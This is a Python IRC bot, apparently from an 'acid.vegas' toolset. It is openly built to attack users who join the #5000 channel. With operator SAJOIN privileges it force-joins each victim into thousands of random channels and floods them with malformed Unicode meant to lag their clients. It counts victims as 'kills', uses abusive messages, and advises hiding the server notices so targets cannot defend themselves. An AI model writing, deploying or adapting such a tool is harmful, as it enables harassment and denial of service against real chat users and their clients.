#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 5000 IRC Bot - Developed by acidvegas in Python (https://git.acid.vegas/supertools)

'''
This bot requires network operator privledges in order to use the SAJOIN command.
The bot will idle in the #5000 channel and #superbowl.
Anyone who joins the #5000 channel will be force joined into 5000 random channels.
It will also spam corrupting unicode that lags some IRC clients.
It will announce in #superbowl who joins the #5000 channel.
The command .kills can be used to see how many people have been 5000'd.
Join #5000 on irc.supernets.org for an example of what this does to an IRC client.
Modify your IRCd to not send a NOTICE on SAJOIN so people will not be able to mitigate it.
Bot is setup to handle abuse, aka people clone flooding in #5000 to try and break the bot.
'''

import os
import random
import socket
import string
import ssl
import time
import threading

nickserv_password='CHANGEME'
operator_password='CHANGEME'

def rnd():
	return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(4, 8)))

def unicode():
	msg='\u202e\u0007\x03' + str(random.randint(2,13))
	for i in range(random.randint(200, 300)):
		msg += chr(random.randint(0x1000,0x3000))
	return msg

def attack(nick):
	try:
		raw(f'PRIVMSG #superbowl :I am fucking the shit out of {nick} right now...')
		count += 1
		if not count % 10:
			with open(log, 'w') as log_file:
				log_file.write(count)
		for i in range(200):
			if nick not in nicks:
				break
			else:
				channels = ','.join(('#' + rnd() for x in range(25)))
				raw(f'SAJOIN {nick} {channels}')
				raw(f'PRIVMSG #5000 :{unicode()} oh god {nick} what is happening {unicode()}')
				raw(f'PRIVMSG {nick} :{unicode()} oh god {nick} what is happening {unicode()}')
				time.sleep(0.3)
	except:
		pass
	finally:
		if nick in nicks:
			nicks.remove(nick)

def raw(msg):
	sock.send(bytes(msg + '\r\n', 'utf-8'))

# Main
log   = os.path.join(os.path.dirname(os.path.realpath(__file__)), '5000.log')
last  = 0
nicks = list()
if not os.path.isfile(log):
	open(log, 'w').write('0')
	count = 0
else:
	count = open(log).read()
while True:
	try:
		sock = ssl.wrap_socket(socket.socket())
		sock.connect(('localhost', 6697))
		raw('USER 5000 0 * :THROWN INTO THE FUCKING WALL')
		raw('NICK FUCKYOU')
		while True:
			try:
				data = sock.recv(1024).decode('utf-8')
				for line in (line for line in data.split('\r\n') if len(line.split()) >= 2):
					print('{0} | [~] - {1}'.format(time.strftime('%I:%M:%S'), line))
					args = line.split()
					if line.startswith('ERROR :Closing Link:'):
						raise Exception('Connection has closed.')
					elif args[0] == 'PING':
						raw('PONG ' + args[1][1:])
					elif args[1] == '001':
						raw('MODE FUCKYOU +BDd')
						raw('PRIVMSG NickServ IDENTIFY FUCKYOU ' + nickserv_password)
						raw('OPER 5000 ' + operator_password)
						raw('JOIN #superbowl')
						raw('JOIN #5000')
					elif args[1] == '401' and len(args) >= 4:
						nick = args[3]
						if nick in nicks:
							nicks.remove(nick)
					elif args[1] == 'JOIN' and len(args) == 3:
						nick = args[0].split('!')[0][1:]
						chan = args[2][1:]
						if chan == '#5000' and nick not in ('acidvegas', 'ChanServ', 'FUCKYOU') and len(nicks) < 3 and nick not in nicks:
							nicks.append(nick)
							threading.Thread(target=attack, args=(nick,)).start()
					elif args[1] == 'PRIVMSG' and len(args) == 4:
						chan = args[2][1:]
						msg  = ' '.join(args[3:])[1:]
						if chan == '#superbowl' and msg == '.kills' and time.time() - last > 3:
							raw('PRIVMSG #superbowl :' + str(count))
							last = time.time()
			except (UnicodeDecodeError, UnicodeEncodeError):
				pass
	except:
		sock.close()
	finally:
		time.sleep(15)